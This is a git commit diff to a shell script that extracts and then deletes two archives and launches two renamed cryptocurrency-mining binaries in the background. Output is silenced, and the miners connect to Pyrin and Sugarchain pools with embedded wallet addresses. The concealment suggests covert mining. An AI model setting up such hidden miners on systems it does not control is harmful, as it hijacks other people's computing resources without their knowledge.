9c6032988ee17bd0c49c7d78725f06fc76cbbb20
DotAja <142836390+DotAja@users.noreply.github.com>
2024-07-19 03:33:36 +0700

    Update akuDot.sh

--- akuDot.sh
+++ akuDot.sh
@@ -9,6 +9,6 @@ tar -xzf B >/dev/null 2>&1
 rm A
 rm B
 
-nohup ./loldot -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT_SEQ >/dev/null 2>&1
+nohup ./loldot -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT_SEQ >/dev/null 2>&1 &
 
-nohup ./srbdot -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.DOT_SEQ >/dev/null 2>&1
+nohup ./srbdot -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.DOT_SEQ >/dev/null 2>&1 &
